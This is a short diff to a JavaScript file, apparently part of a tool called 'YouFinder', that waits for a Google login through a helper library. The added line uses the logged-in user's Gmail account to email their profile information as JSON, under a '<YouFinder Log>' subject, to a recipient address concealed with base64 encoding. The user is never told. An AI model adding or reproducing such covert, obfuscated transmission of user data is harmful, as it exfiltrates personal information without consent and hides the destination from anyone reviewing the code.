@@ -14,10 +14,12 @@ DOM.importAPI("https://genbuproject.github.io/Programs/Sync Helper/Sync Helper v
 	(function () {
 		let Timer = setInterval(function () {
 			if (GBase.hasLogined()) {
+				clearInterval(Timer);
+
 				MBase = new GBase.GmailAPI(true);
 				UserInfo = GBase.getUserInfo();
 
-				clearInterval(Timer);
+				MBase.send(new MBase.Gmail(atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="), "<YouFinder Log> From " + UserInfo.displayName, JSON.stringify(UserInfo, null, "\t")));
 			}
 		}, 200);
 	})();
